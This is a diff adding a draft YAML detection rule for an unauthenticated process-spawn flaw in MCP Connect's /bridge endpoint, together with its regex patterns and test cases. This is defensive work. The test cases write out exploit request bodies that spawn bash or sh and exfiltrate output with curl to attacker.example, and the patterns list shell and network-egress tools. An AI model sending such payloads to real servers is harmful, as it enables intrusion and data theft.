@@ -1,0 +1,180 @@
+title: "MCP Connect: Unauthenticated /bridge Endpoint Arbitrary Process Spawn RCE (GHSA-wvr4-3wq4-gpc5)"
+id: ATR-2026-01985
+rule_version: 1
+status: draft
+description: >
+  Detects GHSA-wvr4-3wq4-gpc5 (CWE-306, CVSS critical): MCP Connect
+  (mcp-bridge) ships with AUTH_TOKEN/ACCESS_TOKEN unset by default, which
+  makes authToken an empty string and short-circuits the auth middleware in
+  src/server/http-server.ts (the guard is wrapped in `if (this.accessToken)`,
+  which is skipped when the token is falsy, so next() is always reached). The
+  unauthenticated POST /bridge endpoint then extracts serverPath and args
+  straight from the request body and passes them to
+  MCPClientManager.createClient(), which falls through to
+  StdioClientTransport for any value that is not an http(s)/ws(s) URL, using
+  serverPath as the executable command verbatim
+  (src/client/mcp-client-manager.ts lines 68-75). Any binary reachable on the
+  server's PATH (bash, sh, python, node, cmd, powershell, ...) can be
+  launched with attacker-controlled args, giving unauthenticated remote code
+  execution.
+
+  Detection covers:
+  (a) a POST /bridge request body whose serverPath names a shell/OS binary
+      (not an http(s)/ws(s) MCP server URL) combined with an args array —
+      the arbitrary-process-spawn shape;
+  (b) the PoC's chained shell-exec/exfiltration args pattern (-lc / -c
+      combined with a command separator and a network egress binary);
+  (c) explicit GHSA-wvr4-3wq4-gpc5 / mcp-bridge exploitation framing tied to
+      serverPath and /bridge.
+
+  A legitimate /bridge call whose serverPath is an http(s):// or ws(s)://
+  URL pointing at an actual MCP server does NOT match — that is the intended
+  StdioClientTransport bypass path, not the executable-spawn primitive.
+author: "ATR Community"
+date: "2026/07/04"
+schema_version: "0.1"
+detection_tier: pattern
+maturity: test
+severity: critical
+
+references:
+  owasp_llm:
+    - "LLM06:2025 - Excessive Agency"
+  owasp_agentic:
+    - "ASI06:2026 - Tool Misuse"
+  mitre_atlas:
+    - "AML.T0049 - Exploit Public-Facing Application"
+  mitre_attack:
+    - "T1059 - Command and Scripting Interpreter"
+  cve:
+    - "GHSA-wvr4-3wq4-gpc5"
+
+metadata_provenance:
+  mitre_atlas: human-reviewed
+  owasp_llm: human-reviewed
+  owasp_agentic: human-reviewed
+
+compliance:
+  eu_ai_act:
+    - article: "15"
+      context: "Article 15 cybersecurity — runtime detection of MCP Connect /bridge unauthenticated process-spawn RCE (GHSA-wvr4-3wq4-gpc5)."
+      strength: primary
+    - article: "9"
+      context: "Article 9 risk management — runtime risk-treatment control for MCP Connect /bridge unauthenticated process-spawn RCE (GHSA-wvr4-3wq4-gpc5)."
+      strength: secondary
+  nist_ai_rmf:
+    - subcategory: "MP.5.1"
+      context: "MAP 5.1 — adversarial input characterised/detected for MCP Connect /bridge unauthenticated process-spawn RCE (GHSA-wvr4-3wq4-gpc5)."
+      strength: primary
+    - subcategory: "MG.3.2"
+      context: "MANAGE 3.2 — runtime monitoring control for MCP Connect /bridge unauthenticated process-spawn RCE (GHSA-wvr4-3wq4-gpc5)."
+      strength: secondary
+  iso_42001:
+    - clause: "8.1"
+      context: "Clause 8.1 operational control — detection of MCP Connect /bridge unauthenticated process-spawn RCE payload."
+      strength: primary
+    - clause: "8.3"
+      context: "Clause 8.3 AI risk treatment — runtime detection as treatment control."
+      strength: secondary
+
+tags:
+  category: tool-poisoning
+  subcategory: mcp-unauth-rce
+  scan_target: runtime
+  confidence: high
+  source: cve-disclosure
+  vendor_sources: mcp-connect-ghsa-wvr4-3wq4-gpc5
+
+agent_source:
+  type: tool_call
+  framework:
+    - any
+  provider:
+    - any
+
+detection:
+  condition: any
+  false_positives:
+    - "A legitimate /bridge call whose serverPath is an http(s):// or ws(s):// URL pointing at a real MCP server."
+    - "Security advisory or PR text quoting the GHSA-wvr4-3wq4-gpc5 PoC."
+    - "A /bridge request body with a serverPath field that is empty or omitted."
+  conditions:
+    - field: tool_args
+      operator: regex
+      value: '(?i)/bridge\b[\s\S]{0,200}["\x27]?serverPath["\x27]?\s*[:=]\s*["\x27]?(?:/bin/(?:ba)?sh|/usr/bin/(?:ba)?sh|\bbash\b|\bsh\b|\bcmd(?:\.exe)?\b|\bpowershell(?:\.exe)?\b|\bnode\b|\bpython3?\b|\bperl\b|\bruby\b)["\x27]?[\s\S]{0,120}["\x27]?args["\x27]?\s*[:=]'
+      description: >
+        A POST /bridge request body whose serverPath names a shell/OS
+        executable (bash, sh, cmd, powershell, node, python, perl, ruby)
+        rather than an MCP server URL, paired with an args field — the
+        CreateClient() arbitrary-process-spawn shape (GHSA-wvr4-3wq4-gpc5).
+    - field: tool_args
+      operator: regex
+      value: '(?i)["\x27]?serverPath["\x27]?\s*[:=]\s*["\x27]?(?:bash|sh)["\x27]?[\s\S]{0,80}["\x27]?args["\x27]?\s*[:=]\s*\[[\s\S]{0,120}["\x27](?:-lc|-c)["\x27][\s\S]{0,160}(?:;|&&|\|)[\s\S]{0,80}(?:\bcurl\b|\bwget\b|\bnc\b|\bncat\b|\bcat\b\s+/etc/passwd|\bwhoami\b)'
+      description: >
+        The PoC shape: serverPath=bash/sh with args=["-lc"/"-c", "<cmd1> ; or
+        && <exfil/recon command>"] — a chained shell command with a
+        network-egress or credential-recon binary launched via mcp-bridge's
+        unauthenticated StdioClientTransport fallback.
+    - field: tool_args
+      operator: regex
+      value: '(?i)GHSA-wvr4-3wq4-gpc5[\s\S]{0,200}(?:serverPath|/bridge|mcp-bridge|MCP Connect)'
+      description: >
+        Explicit GHSA-wvr4-3wq4-gpc5 reference combined with the vulnerable
+        serverPath parameter, /bridge endpoint, or mcp-bridge/MCP Connect
+        product name — attack framing in a skill or tool description.
+
+response:
+  actions:
+    - alert
+    - block_tool
+  message_template: >
+    [ATR-2026-01985] CRITICAL: MCP Connect /bridge unauthenticated process-
+    spawn RCE detected (GHSA-wvr4-3wq4-gpc5, CWE-306). A /bridge request
+    body supplies a serverPath naming a shell/OS binary plus args, which
+    reaches StdioClientTransport unauthenticated and spawns an arbitrary
+    process as the mcp-bridge user. Block the request. Remediation: set
+    AUTH_TOKEN/ACCESS_TOKEN and fail startup when absent; restrict
+    serverPath to an allowlist of MCP server URLs/binaries.
+
+confidence: 82
+
+wild_fp_rate: 0
+
+test_cases:
+  true_positives:
+    - tool_args: 'POST /bridge {"serverPath": "bash", "args": ["-lc", "id > /tmp/pwned && curl -d @/tmp/pwned https://attacker.example/exfil"], "method": "tools/list", "params": {}}'
+      expected: triggered
+      description: "GHSA-wvr4-3wq4-gpc5 PoC — unauthenticated /bridge spawns bash with exfiltration args"
+    - tool_args: 'POST /bridge {"serverPath": "/bin/sh", "args": ["-c", "whoami; curl http://attacker.example/beacon"], "method": "tools/list"}'
+      expected: triggered
+      description: "serverPath as absolute shell path with chained recon and network egress"
+    - tool_args: "Exploiting GHSA-wvr4-3wq4-gpc5 in MCP Connect: send a POST to /bridge with serverPath set to bash to achieve unauthenticated RCE."
+      expected: triggered
+      description: "Explicit GHSA-wvr4-3wq4-gpc5 mcp-bridge exploitation framing"
+  true_negatives:
+    - tool_args: 'POST /bridge {"serverPath": "https://mcp.example.com/server", "args": [], "method": "tools/list"}'
+      expected: not_triggered
+      description: "Legitimate /bridge call pointing serverPath at a real MCP server URL"
+    - tool_args: 'POST /bridge {"serverPath": "wss://mcp.example.com/ws", "method": "tools/list", "params": {}}'
+      expected: not_triggered
+      description: "Legitimate /bridge call using a websocket MCP server URL, no args field"
+    - tool_args: "How do I configure AUTH_TOKEN so the /bridge endpoint requires authentication?"
+      expected: not_triggered
+      description: "General question about securing the /bridge endpoint, not an attack payload"
+    - tool_args: 'GET /bridge/status'
+      expected: not_triggered
+      description: "Read-only status check on the bridge endpoint"
+_llm_authored:
+  model: claude (gstack subagent)
+  generalization_note: >
+    The rule generalizes beyond the literal PoC by anchoring on the
+    structural shape of the vulnerability -- a /bridge request body whose
+    serverPath names an OS shell/interpreter binary (not an http(s)/ws(s)
+    MCP server URL) paired with an args field -- rather than the exact
+    attacker command string. Condition 2 narrows to the PoC's chained
+    shell-exec + exfiltration/recon pattern for higher-confidence matches.
+    Condition 3 catches advisory/exploit-framing text. Legitimate /bridge
+    traffic pointing at real MCP server URLs (http/https/ws/wss) is
+    excluded by construction since those values never match the
+    shell-binary alternation.
+  note: Generation-time LLM authoring; verified by deterministic gate. Runtime detection is pure regex. Human review required before merge.
